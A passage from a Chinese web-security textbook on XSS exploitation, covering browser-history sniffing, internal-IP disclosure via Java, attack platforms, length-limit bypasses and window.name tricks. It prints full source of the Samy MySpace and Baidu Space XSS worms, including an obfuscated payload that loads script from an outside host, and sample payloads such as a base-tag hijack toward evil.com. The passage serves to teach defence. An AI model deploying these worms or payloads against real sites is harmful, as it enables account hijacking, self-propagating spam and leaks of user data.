IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
THE POSSIBILITY OF SUCH DAMAGE.
*/


/* A short list of websites to loop through checking to see if the victim has been there.
Without noticable performance overhead, testing couple of a couple thousand URL's is
possible within a few seconds. */
var websites = [
 "http://ha.ckers.org/blog/",
 "http://login.yahoo.com/",
 "http://mail.google.com/",
 "http://mail.yahoo.com/",
 "http://my.yahoo.com/",
 "http://sla.ckers.org/forum/",
 "http://slashdot.org/",
 "http://www.amazon.com/",
 "http://www.aol.com/",
 "http://www.apple.com/",
 "http://www.bankofamerica.com/",
 "http://www.bankone.com/",
 "http://www.blackhat.com/",
 "http://www.blogger.com/",
 "http://www.bofa.com/",
 "http://www.capitalone.com/",
 "http://www.cgisecurity.com/",
 "http://www.chase.com/",
 "http://www.citibank.com/",
 "http://www.cnn.com/",
 "http://www.comerica.com/",
 "http://www.e-gold.com/",
 "http://www.ebay.com/",
 "http://www.etrade.com/",
 "http://www.flickr.com/",
 "http://www.google.com/",
 "http://www.hsbc.com/",
 "http://www.icq.com/",
 "http://www.live.com/",
 "http://www.microsoft.com/",
 "http://www.microsoft.com/en/us/default.aspx",
 "http://www.msn.com/",
 "http://www.myspace.com/",
 "http://www.passport.net/",
 "http://www.paypal.com/",
 "http://www.rsaconference.com/2007/US/",
 "http://www.salesforce.com/",
 "http://www.sourceforge.net/",
 "http://www.statefarm.com/",
 "http://www.usbank.com/",
 "http://www.wachovia.com/",
 "http://www.wamu.com/",
 "http://www.wellsfargo.com/",
 "http://www.whitehatsec.com/home/index.html",
 "http://www.wikipedia.org/",
 "http://www.xanga.com/",
 "http://www.yahoo.com/",
 "http://www2.blogger.com/home",
 "https://banking.wellsfargo.com/",
 "https://commerce.blackhat.com/",


];

/* Loop through each URL */
for (var i = 0; i < websites.length; i++) {

 /* create the new anchor tag with the appropriate URL information */
 var link = document.createElement("a");
 link.id = "id" + i;
 link.href = websites[i];
 link.innerHTML = websites[i];

 /* create a custom style tag for the specific link. Set the CSS visited selector to a
known value, in this case red */
 document.write('<style>');
 document.write('#id' + i + ":visited {color: #FF0000;}");
 document.write('</style>');

 /* quickly add and remove the link from the DOM with enough time to save the visible
computed color. */
 document.body.appendChild(link);
 var color =
document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
 document.body.removeChild(link);

 /* check to see if the link has been visited if the computed color is red */
 if (color == "rgb(255, 0, 0)") { // visited

 /* add the link to the visited list */
 var item = document.createElement('li');
 item.appendChild(link);
 document.getElementById('visited').appendChild(item);

 } else { // not visited

 /* add the link to the not visited list */
 var item = document.createElement('li');
 item.appendChild(link);
 document.getElementById('notvisited').appendChild(item);

 } // end visited color check if

} // end URL loop
// -->
</script>


```
但是Firefox在2010年3月底决定修补这个问题，因此，未来这种信息泄露的问题可能在Mozilla浏览器中不会再继续存在了。



获取用户的真实IP地址
通过XSS Payload还有办法获取一些客户端的本地IP地址。
很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢？
JavaScript本身并没有提供获取本地IP地址的能力，有没有其他办法？一般来说，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。
在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API：

```
/**
* @cat DOM
* @name AttackAPI.dom.getInternalIP
* @desc get internal IP address
* @return {String} IP address
   */
  AttackAPI.dom.getInternalIP = function () {
       try {
               var sock = new java.net.Socket();

               sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
               sock.connect(new java.net.InetSocketAddress(document.domain,
  (!document.location.port)?80:document.location.port));

               return sock.getLocalAddress().getHostAddress();
       } catch (e) {}

       return '127.0.0.1';
  };



  此外，还有两个利用Java获取本地网络信息的API：/**
* @cat DOM
* @name AttackAPI.dom.getInternalHostname
* @desc get internal hostname
* @return {String} hostname
   */
  AttackAPI.dom.getInternalHostname = function () {
       try {
               var sock = new java.net.Socket();

               sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
               sock.connect(new java.net.InetSocketAddress(document.domain,
  (!document.location.port)?80:document.location.port));

               return sock.getLocalAddress().getHostName();
       } catch (e) {}
       return 'localhost';
  };

/**
* @cat DOM
* @name AttackAPI.dom.getInternalNetworkInfo
* @desc get the internal network information
* @return {Object} network information object
   */
  AttackAPI.dom.getInternalNetworkInfo = function () {
       var info = {hostname: 'localhost', IP: '127.0.0.1'};

       try {
               var sock = new java.net.Socket();

               sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
               sock.connect(new java.net.InetSocketAddress(document.domain,
  (!document.location.port)?80:document.location.port));

               info.IP = sock.getLocalAddress().getHostAddress();
               info.hostname = sock.getLocalAddress().getHostName();
       } catch (e) {}

       return info;
  };


```


  这种方法需要攻击者写一个Java Class，嵌入到当前页面中。除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要根据具体情况具体分析，这里不赘述了。



  Metasploit引擎曾展示过一个强大的测试页面，综合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件的功能，抓取用户的本地信息，有兴趣深入研究的读者可以参考。

<hr />
### 3.2.3 XSS 攻击平台



XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台的主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面就介绍几个常见的XSS攻击平台。



### Attack API

Attack API是安全研究者pdp所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式。比如上节提到的“获取客户端本地信息的API”就出自这个项目。
BeEF
BeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整的XSS攻击过程。BeEF有一个控制后台，攻击者可以在后台控制前端的一切。



每个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，并可以通过XSS向这些用户发送命令。



### XSS-Proxy
XSS-Proxy是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器。
XSS-Proxy的实现原理
这些XSS攻击平台有助于深入理解XSS的原理和危害。



### 3.2.4 终极武器：XSS Worm



终极武器：XSS Worm

XSS也能形成蠕虫吗？我们知道，以往的蠕虫是利用服务器端软件漏洞进行传播的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。



Samy Worm

在2005年，年仅19岁的Samy Kamkar发起了对MySpace.com的XSS Worm攻击。Samy Kamkar的蠕虫在短短几小时内就感染了100万用户——它在每个用户的自我简介后边加了一句话：“but most of all, Samy is my hero.”（Samy是我的偶像）。这是Web安全史上第一个重量级的XSS Worm，具有里程碑意义。



今天我们看看当时的Samy蠕虫都做了些什么？


首先，MySpace过滤了很多危险的HTML标签，只保留了`<a>标签`、`<img>标签`、`<div>标签`等“安全的标签”。所有的事件比如“onclick”等也被过滤了。但是MySpace却允许用户控制标签的style属性，通过style，还是有办法构造出XSS的。比如：


```
<div style="background:url('javascript:alert(1)')">
```

其次，MySpace同时还过滤了`javascript`、`onreadystatechange`等敏感词，所以Samy用了“拆分法”绕过这些限制。
最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名字的功能；同时复制蠕虫自身进行传播。至此，XSS Worm就完成了。有兴趣的读者可以参考Samy蠕虫的技术细节分析。




下面附上Samy Worm的源代码。这是具有里程碑意义的第一个XSS Worm，原本的代码压缩在一行内。为了方便阅读，如下代码已经经过了整理和美化。


```
<div id=mycode style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')"
    expr="var B=String.fromCharCode(34);
    var A=String.fromCharCode(39);
    function g(){
      var C;
      try{
        var D=document.body.createTextRange();
        C=D.htmlText
      }catch(e){
      }

      if(C){
        return C
      }else{
      return eval('document.body.inne'+'rHTML')
      }
    }

    function getData(AU){
      M=getFromURL(AU,'friendID');
      L=getFromURL(AU,'Mytoken')
    }

    function getQueryParams(){
      var E=document.location.search;
      var F=E.substring(1,E.length).split('&');
      var AS=new Array();

      for(var O=0;O<F.length;O++){
        var I=F[O].split('=');
        AS[I[0]]=I[1]}return AS
      }

      var J;
      var AS=getQueryParams();
      var L=AS['Mytoken'];
      var M=AS['friendID'];

      if(location.hostname=='profile.myspace.com'){
        document.location='http://www.myspace.com'+location.pathname+location.search
      }else{
        if(!M){
          getData(g())
        }
        main()
      }

      function getClientFID(){
        return findIn(g(),'up_launchIC( '+A,A)
      }

      function nothing(){}

      function paramsToString(AV){
        var N=new String();
        var O=0;
        for(var P in AV){
          if(O>0){
            N+='&'
          }
          var Q=escape(AV[P]);

          while(Q.indexOf('+')!=-1){
            Q=Q.replace('+','%2B')
          }

          while(Q.indexOf('&')!=-1){
            Q=Q.replace('&','%26')
          }

          N+=P+'='+Q;
          O++
        }
        return N
      }
      function httpSend(BH,BI,BJ,BK){
        if(!J){
          return false
        }

        eval('J.onr'+'eadystatechange=BI');

        J.open(BJ,BH,true);

        if(BJ=='POST'){
          J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
          J.setRequestHeader('Content-Length',BK.length)
        }

        J.send(BK);

        return true
      }

      function findIn(BF,BB,BC){
        var R=BF.indexOf(BB)+BB.length;
        var S=BF.substring(R,R+1024);
        return S.substring(0,S.indexOf(BC))
      }

      function getHiddenParameter(BF,BG){
        return findIn(BF,'name='+B+BG+B+' value='+B,B)
      }

      function getFromURL(BF,BG){
        var T;
        if(BG=='Mytoken'){
          T=B
        }else{
          T='&'
        }

        var U=BG+'=';
        var V=BF.indexOf(U)+U.length;
        var W=BF.substring(V,V+1024);
        var X=W.indexOf(T);
        var Y=W.substring(0,X);
        return Y
      }

      function getXMLObj(){
        var Z=false;
        if(window.XMLHttpRequest){
          try{
            Z=new XMLHttpRequest()
          }catch(e){
            Z=false
          }
        }else if(window.ActiveXObject){
          try{
            Z=new ActiveXObject('Msxml2.XMLHTTP')
          }catch(e){
            try{
              Z=new ActiveXObject('Microsoft.XMLHTTP')
            }catch(e){
              Z=false
            }
          }
        }
        return Z
      }

      var AA=g();
      var AB=AA.indexOf('m'+'ycode');
      var AC=AA.substring(AB,AB+4096);
      var AD=AC.indexOf('D'+'IV');
      var AE=AC.substring(0,AD);
      var AF;

      if(AE){
        AE=AE.replace('jav'+'a',A+'jav'+'a');
        AE=AE.replace('exp'+'r)','exp'+'r)'+A);
        AF=' but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'
      }

      var AG;

      function getHome(){
        if(J.readyState!=4){
          return
        }

        var AU=J.responseText;
        AG=findIn(AU,'P'+'rofileHeroes','</td>');
        AG=AG.substring(61,AG.length);

        if(AG.indexOf('samy')==-1){
          if(AF){
            AG+=AF;
            var AR=getFromURL(AU,'Mytoken');
            var AS=new Array();
            AS['interestLabel']='heroes';
            AS['submit']='Preview';
            AS['interest']=AG;
            J=getXMLObj();
            httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,
'POST',paramsToString(AS))
          }
        }
      }

      function postHero(){
        if(J.readyState!=4){
          return
        }

        var AU=J.responseText;
        var AR=getFromURL(AU,'Mytoken');
        var AS=new Array();
        AS['interestLabel']='heroes';
        AS['submit']='Submit';
        AS['interest']=AG;
        AS['hash']=getHiddenParameter(AU,'hash');
        httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,
'POST',paramsToString(AS))
      }

      function main(){
        var AN=getClientFID();
        var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;
        J=getXMLObj();
        httpSend(BH,getHome,'GET');
        xmlhttp2=getXMLObj();
        httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&
Mytoken=' +L,processxForm,'GET')
      }

      function processxForm(){
        if(xmlhttp2.readyState!=4){
        return
      }

      var AU=xmlhttp2.responseText;
      var AQ=getHiddenParameter(AU,'hashcode');
      var AR=getFromURL(AU,'Mytoken');
      var AS=new Array();
      AS['hashcode']=AQ;
      AS['friendID']='11851658';
      AS['submit']='Add to Friends';
      httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,
'POST',paramsToString(AS))
    }

    function httpSend2(BH,BI,BJ,BK){
      if(!xmlhttp2){
        return false
      }

      eval('xmlhttp2.onr'+'eadystatechange=BI');
      xmlhttp2.open(BJ,BH,true);

      if(BJ=='POST'){
        xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
        xmlhttp2.setRequestHeader('Content-Length',BK.length)}
        xmlhttp2.send(BK);
        return true
      }"></DIV>

```


XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起XSS Worm攻击也有一定的条件。



一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。



发送站内信、用户留言等页面，都是XSS Worm的高发区，需要重点关注。而相对的，如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。



下面这个XSS Worm的案例来自百度。


2007年12月，百度空间的用户忽然互相之间开始转发垃圾短消息，后来百度工程师紧急修复了这一漏洞：


百度空间的XSS蠕虫公告

```
这次事件，是由XSS Worm造成的。时任百度系统部高级安全顾问的方小顿，分析了这个蠕虫的技术细节，他在文中写到：
上面基本就是代码，总体来说，还是很有意思的。
首先就是漏洞，过滤多一个字符都不行，甚至挪一个位置都不行（上面的Playload部分）。这个虫子比较特殊的地方是感染IE用户，对其他用户无影响；另外就是完全可以隐蔽地传播，因为只是在CSS中加代码并不会有什么明显的地方，唯一的缺陷是有点卡。所以，完全可以长时间地存在，感染面不限制于blog，存在CSS的地方都可以，譬如Profile。
另外比较强大的一点就是跟真正的虫子一样，不只是被动地等待，选择在好友发消息时引诱别人过来访问自己的blog，利用好奇心可以做到这点。
最后还加了个给在线人随机发消息请求加链接，威力可能更大，因为会创造比较大的基数，这样一感染就是一个blog。
到Baidu封锁时，这个虫子已经感染了8700多个blog。总体来说还不错，本来想作为元旦的一个贺礼，不过还是提前死掉了。可以看到，在代码和流程里运用了很多系统本身就有的特性，自己挖掘吧。
```


这个百度XSS Worm的源代码如下：

```javascript
window.onerror = killErrors;
execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D
%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20
%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Ab
s%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20s
trReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20
%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20
%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20
%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20
%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%2
0%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20
innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strR
eturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Lo
w8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding
%20%3D%20strReturn%0AEnd%20Function'),'VBScript');
cookie='';
cookieval=document.cookie;
spaceid=spaceurl;
myhibaidu="http://hi.baidu.com"+spaceid;
xmlhttp=poster();
debug=0;

online();

if(spaceid!='/') {
  if(debug==1) {
    goteditcss();
    document.cookie='xssshell/owned/you!';
  }
  if(cookieval.indexOf('xssshell')==-1) {
    goteditcss();
    document.cookie='xssshell/owned/you!';
  }
}

function makeevilcss(spaceid,editurl,use){
  playload="a{evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc
  %2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bva
  r%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%2
  53D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd
  %252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%
  2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%
  2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%2
  53Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))}";
  action=myhibaidu+"/commit";
  spCssUse=use;
  s=getmydata(editurl);

  re = /\<input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;
  ct = s.match(re);
  ct=(ct[1]);

  re = /\<input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;
  cm = s.match(re);
  cm=(cm[1])/1+1;

  re = /\<input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;
  spCssID = s.match(re);
  spCssID=(spCssID[1]);

  spRefUrl=editurl;

  re = /\<textarea(.*?)\>([^\x00]*?)\<\/textarea\>/i;
  spCssText = s.match(re);
  spCssText=spCssText[2];
  spCssText=URLEncoding(spCssText);

  if(spCssText.indexOf('evilmask')!==-1) {
    return 1;
  }
  else spCssText=spCssText+"\r\n\r\n"+playload;

  re = /\<input name=\"spCssName\"(.*?)value=\"(.*?)\">/i;
  spCssName = s.match(re);
  spCssName=spCssName[2];

  re = /\<input name=\"spCssTag\"(.*?)value=\"(.*?)\">/i;
  spCssTag = s.match(re);
  spCssTag=spCssTag[2];

  postdata="ct="+ct+"&spCssUse=1"+"&spCssColorID=1"+"&spCssLayoutID=-1"+"&spRefURL="+UR
  LEncoding(spRefUrl)+"&spRefURL="+URLEncoding(spRefUrl)+"&cm="+cm+"&spCssID="+spCssID+
  "&spCssText="+spCssText+"&spCssName="+URLEncoding(spCssName)+"&spCssTag="+URLEncoding
  (spCssTag);
  result=postmydata(action,postdata);
  sendfriendmsg();
  count();
  hack();
}

function goteditcss() {
  src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0";
  s=getmydata(src);
  re = /\<link rel=\"stylesheet\" type=\"text\/css\"
  href=\"(.*?)\/css\/item\/(.*?)\.css\">/i;
  r = s.match(re);
  nowuse=r[2];
  makeevilcss(spaceid,"http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit"
  ,1);
  return 0;
}

function poster(){
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
    if(request.overrideMimeType) {
      request.overrideMimeType('text/xml');
    }
  } else if(window.ActiveXObject) {
    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP',
    'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0',
    'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
    for(var i=0; i<versions.length; i++) {
      try {
        request = new ActiveXObject(versions[i]);
      } catch(e) {}
    }
  }
  return request;
}

function postmydata(action,data){
  xmlhttp.open("POST", action, false);
  xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xmlhttp.send(data);
  return xmlhttp.responseText;
}

function getmydata(action){
  xmlhttp.open("GET", action, false);
  xmlhttp.send();
  return xmlhttp.responseText;
}

function killErrors() {
  return true;
}

function count() {
  a=new Image();
  a.src='http://img.users.51.la/1563171.asp';
  return 0;
}

function online() {
  online=new Image();
  online.src='http://img.users.51.la/1563833.asp ';
  return 0;
}

function hack() {
  return 0;
}

function sendfriendmsg(){
  myfurl=myhibaidu+"/friends";
  s=getmydata(myfurl);
  evilmsg="哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！
  \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibai
  du;

  var D=function(A,B){A[A.length]=B;};
  re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;
  friends = s.match(re);
  eval(friends[0]);
  for(i in k) {
    eval('msgimg'+i+'=new Image();');
    eval('msgimg'+i+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn="+URLE
    ncoding(k[i][2])+"&co="+URLEncoding(evilmsg)+"&vcodeinput=";');
  }
}

```



后来又增加了一个传播函数，不过那个时候百度已经开始屏蔽此蠕虫了：

```javascript
function onlinemsg(){
  doit=Math.floor(Math.random() * (600 + 1));
  if(doit>500) {
    evilonlinemsg="哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是"+myhibaidu;
    xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async=false;
    xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml");
    online=xmlDoc.documentElement;
    users=online.getElementsByTagName("id");
    x=Math.floor(Math.random() * (200 + 1));
    eval('msgimg'+x+'=new Image();');
    eval('msgimg'+x+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=
    "+URLEncoding(users[x].text)+"&co="+URLEncoding(evilonlinemsg)+"&vcodeinput=";');
  }
}

```


攻击者想要通过XSS做坏事是很容易的，而XSS Worm则能够把这种破坏无限扩大，这正是大型网站所特别担心的事情



无论是MySpace蠕虫，还是百度空间的蠕虫，都是“善意”的蠕虫，它们只是在“恶作剧”，而没有真正形成破坏。真正可怕的蠕虫，是那些在无声无息地窃取用户数据、骗取密码的“恶意”蠕虫，这些蠕虫并不会干扰用户的正常使用，非常隐蔽。

<hr />
### 3.2.6 XSS构造技巧



“百度搜藏”曾经出现过一个这样的XSS漏洞。百度在一个`<script>`标签中输出了一个变量，其中转义了双引号：

`var redirectUrl="\";alert(/XSS/);";`

一般来说，这里是没有XSS漏洞的，因为变量处于双引号之内，系统转义了双引号导致变量无法``“escape”``。

但是，百度的返回页面是GBK/GB2312编码的，因此“%c1\”这两个字符组合在一起后，会成为一个Unicode字符。在Firefox下会认为这是一个字符，所以构造：

``%c1";alert(/XSS/);//``

并提交：
提交的数据包在Firefox下得到如下效果：
在Firefox下的效果
这两个字节：`%c1\`组成了一个新的Unicode字符，`%c1`把转义符号``\``给“吃掉了”，从而绕过了系统的安全检查，成功实施了XSS攻击。



绕过长度限制
很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的。假设下面代码存在一个XSS漏洞：

```
<input type=text value="$var" />

```

服务器端如果对输出变量“$var”做了严格的长度限制，那么攻击者可能会这样构造XSS：

```
$var为： "><script>alert(/xss/)</script>

```

希望达到的输出效果是：

```
<input type=text value=""><script>alert(/xss/)</script>" />

```

假设长度限制为20个字节，则这段XSS会被切割为：

```
$var 输出为： "><script> alert(/xss

```

连一个完整的函数都无法写完，XSS攻击可能无法成功。那此时，是不是万事大吉了呢？答案是否定的。
攻击者可以利用事件（Event）来缩短所需要的字节数：

```
$var 输出为： "onclick=alert(1)//
加上空格符，刚好够20个字节，实际输出为：
<input type=text value="" onclick=alert(1)// "/>
当用户点击了文本框后，alert()将执行.

```



但利用“事件”能够缩短的字节数是有限的。最好的办法是把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload。



最常用的一个“藏代码”的地方，就是“location.hash”。而且根据HTTP协议，location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下location.hash里的内容，从而也更好地隐藏了黑客真实的意图。

```
$var 输出为： " onclick="eval(location.hash.substr(1))


```

总共是40个字节。输出后的HTML是：


```
<input type="text" value="" onclick="eval(location.hash.substr(1)) " />因为location.hash的第一个字符是 # ，所以必须去除第一个字符才行。此时构造出的XSS URL为：
http://www.a.com/test.html#alert(1)

```
用户点击文本框时，location.hash里的代码执行了。



location.hash本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够写很长的XSS Payload了。要是地址栏的长度也不够用，还可以再使用加载远程JS的方法，来写更多的代码。
在某些环境下，可以利用注释符绕过长度限制。
比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个`<input>`标签。


```
<input id=1 type="text" value="" />
xxxxxxxxxxxxx
<input id=2 type="text" value="" />
在第一个input框中，输入：
 "><!--
在第二个input框中，输入：--><script>alert(/xss/);</script>
最终的效果是：
<input id=1 type="text" value=""><!--" />
xxxxxxxxxxxxxxxxx
<input id=2 type="text" value="--><script>alert(/xss/);</script>" />
中间的代码全部被
<!--  … -->

```

给注释掉了！



而在第一个input框中，只用到了短短的6个字节！




```
使用<base>标签
<base>标签并不常用，它的作用是定义页面上的所有使用“相对路径”标签的hosting地址。
比如，打开一张不存在的图片：
<body>
<img src="/intl/en_ALL/images/srpr/logo1w.png" />
</body>
测试页面
这张图片实际上是Google的一张图片，原地址为：http://www.google.com/intl/en_ALL/images/srpr/logo1w.png
在<img>标签前加入一个<base>标签：
<body>
<base href="http://www.google.com" />
<img src="/intl/en_ALL/images/srpr/logo1w.png" />
</body>
<base>标签将指定其后的标签默认从“http://www.google.com”取URL：
测试页面图片被找到了。
需要特别注意的是，在有的技术文档中，提到<base>标签只能用于<head>标签之内，其实这是不对的。<base>标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。
攻击者如果在页面中插入了<base>标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。比如：
<base href="http://www.evil.com" />
….
<script src="x.js" ></script>
….
<img src="y.jpg" />
…
<a href="auth.do" >auth</a>
所以在设计XSS安全方案时，一定要过滤掉这个非常危险的标签。

```


<hr />
window.name的妙用

`window.name`对象是一个很神奇的东西。对当前窗口的window.name对象赋值，没有特殊字符的限制。因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据。在某些环境下，这种特性将变得非常有用。



```
参考以下案例。假设“www.a.com/test.html”的代码为：
<body>
<script>
window.name = "test";
alert(document.domain+"    "+window.name);
window.location = "http://www.b.com/test1.html";
</script>
</body>
这段代码将window.name赋值为test，然后显示当前域和window.name的值，最后将页面跳转到“www.b.com/test1.html”。
“www.b.com/test1.html”的代码为：
<body>
<script>
alert(document.domain+"    "+window.name);
</script>
</body>

```

这里显示了当前域和window.name的值。最终效果如下，访问“www.a.com/test.html”：


测试页面
window.name赋值成功，然后页面自动跳转到“www.b.com/test1.html”：


测试页面
这个过程实现数据的跨域传递：“test”这个值从www.a.com传递到www.b.com。



使用window.name可以缩短`XSS Payload`的长度，如下所示：

```
<script>
window.name = "alert(document.cookie)";
locaton.href = "http://www.xssedsite.com/xssed.php";
</script>
```

在同一窗口打开XSS的站点后，只需通过XSS执行以下代码即可：

```
eval(name);

```

只有11个字节，短到了极点。

这个技巧为安全研究者luoluo所发现，同时他还整理了很多绕过XSS长度限制的技巧。

<hr />
### 3.2.7 变废为宝：Mission Impossible



从XSS漏洞利用的角度来看，存储型XSS对攻击者的用处比反射型XSS要大。因为存储型XSS在用户访问正常URL时会自动触发；而反射型XSS会修改一个正常的URL，一般要求攻击者将XSS URL发送给用户点击，无形中提高了攻击的门槛。



而有的XSS漏洞，则被认为只能够攻击自己，属于“鸡肋”漏洞。但随着时间的推移，数个曾经被认为是无法利用的XSS漏洞，都被人找到了利用方法。
3.2.7.1　Apache Expect Header XSS
“Apache Expect Header XSS”漏洞最早公布于2006年。这个漏洞曾一度被认为是无法利用的，所以厂商不认为这是个漏洞。这个漏洞的影响范围是：Apache Httpd Server版本1.3.34、2.0.57、2.2.1及以下。漏洞利用过程如下。


向服务器提交：


```
GET / HTTP/1.1
Accept: */*
Accept-Language: en-gb
Content-Type: application/x-www-form-urlencoded
Expect: <script>alert('http://www.whiteacid.org is vulnerable to the Expect Header
vulnerability.');</script>
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET
CLR 1.1.4322)
Host: www.whiteacid.org
Connection: Keep-Alive

```

服务器返回：


```
HTTP/1.1 417 Expectation Failed
Date: Thu, 21 Sep 2006 20:44:52 GMT
Server: Apache/1.3.33 (Unix) mod_throttle/3.1.2 DAV/1.0.3 mod_fastcgi/2.4.2
mod_gzip/1.3.26.1a PHP/4.4.2 mod_ssl/2.8.22 OpenSSL/0.9.7e
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=iso-8859-1
1ba
